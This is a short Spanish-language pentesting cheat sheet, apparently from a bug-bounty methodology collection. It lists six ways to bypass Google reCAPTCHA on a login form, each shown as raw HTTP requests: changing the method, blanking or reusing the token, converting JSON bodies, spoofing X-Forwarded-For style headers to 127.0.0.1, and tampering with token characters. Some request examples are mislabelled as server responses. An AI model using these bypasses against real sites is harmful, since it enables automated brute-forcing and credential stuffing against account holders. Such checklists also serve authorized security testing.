# Bypass Captcha (Google reCAPTCHA)

1 - Intente cambiar el método de solicitud, por ejemplo POST a GET

Respuesta del servidor:

    POST / HTTP 1.1
    Host: host.com
    ...

    _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=target123
    
Cambiando el método a GET

    GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=target123 HTTP 1.1
    Host: host.com
    ...
    
2 - Intenta eliminar el valor del parámetro captcha

    POST / HTTP 1.1
    Host: host.com
    ...

    _RequestVerificationToken=&_Username=daffa&_Password=target123
    
3 - Intente reutilizar el antiguo token de captcha 

    POST / HTTP 1.1
    Host: host.com
    ...

    _RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=target123
    
4 - Convierta los datos JSON en un parámetro de solicitud normal 

Respuesta del servidor:

    POST / HTTP 1.1
    Host: host.com
    ...

    {"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"test","_Password":"target123"}
    
Convirtiendo la respuesta a solicitud normal
 
    POST / HTTP 1.1
    Host: host.com
    ...

    _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=test&_Password=target123
    
5 - Pruebe el Header personalizado para Bypassing Captcha   
 
    X-Originating-IP: 127.0.0.1
    X-Forwarded-For: 127.0.0.1
    X-Remote-IP: 127.0.0.1
    X-Remote-Addr: 127.0.0.1
    
6 - Cambie algunos caracteres específicos del parámetro captcha y vea si es posible eludir la restricción

Respuesta del servidor:

    POST / HTTP 1.1
    Host: host.com
    ...

    _RequestVerificationToken=xxxxxxxxxxxxxx&_Username=test&_Password=target123
    
Prueba esto para Bypass

    POST / HTTP 1.1
    Host: target.com
    ...

    _RequestVerificationToken=xxxdxxxaxxcxxx&_Username=test&_Password=target123
